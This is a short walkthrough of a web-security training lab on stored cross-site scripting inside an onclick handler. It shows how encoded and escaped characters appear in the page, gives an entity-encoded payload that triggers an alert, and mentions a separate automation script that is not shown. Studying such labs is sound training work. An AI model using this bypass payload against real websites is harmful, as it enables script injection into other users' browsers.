# XSS LAB 20 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Analyze the Vulnerability
- Submit a comment with the following value in the website field: `http: ' " / \ < > `
- Review the page source and locate the relavent `<a>` tag.
```html
<a id="author" href="http: \' &quot; / \\ &lt; &gt; " onclick="var tracker={track(){}};tracker.track('http: \' &quot; / \\ &lt; &gt; ');">sadfsa</a> 
```
- As seen in the HTML output:
    - `'`,`\` are escaped.
    - `"`,`< >` are encoded.

### 3. Inject the XSS payload
- `&apos;` is the encoded version of `'`; 
- Submit a comment with the following value in the website field: `http: &apos;-alert(1)-&apos;`
- When you click the name an alert pop-up appears.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_20.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```